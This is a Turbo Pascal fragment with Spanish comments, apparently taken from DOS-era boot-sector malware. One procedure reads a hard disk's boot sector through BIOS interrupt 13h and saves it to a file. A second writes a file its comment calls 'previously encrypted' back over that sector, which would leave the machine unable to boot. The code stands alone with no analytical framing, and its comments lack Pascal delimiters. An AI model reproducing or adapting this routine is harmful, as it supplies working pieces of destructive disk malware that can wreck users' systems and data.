procedure lee_boot;       leemos el boot de C:\

var
  boot             :array[0..511] of byte;
  r                :registers;
  fout             :file;
begin
  r.ax:=$0201;
  r.bx:=ofs(boot);
  r.es:=seg(boot);
  r.dx:=$0180;  le indicamos que es el C:\ (b: es 0001 y a: es 0000)
  r.cx:=$0001;
  intr($13,r);
  assign(fout,'boot.sec');      guardamos temporariamente el boot en el file
  rewrite(fout,512);
  blockwrite(fout,boot,1);
  close(fout);
end;

............................................................................

procedure escribe_boot;     escribimos el boot...8-}

var
  boot             :array[0..511] of byte;
  r                :registers;
  fin              :file;
begin
  assign(fin,'boot.sec');  leemos el file previamente encriptado.
  reset(fin,512);
  blockread(fin,boot,1);
  close(fin);
  r.ax:=$0301;      escribir..... 
  r.bx:=ofs(boot);
  r.es:=seg(boot);
  r.dx:=$0180;
  r.cx:=$0001;
  intr($13,r);
end;

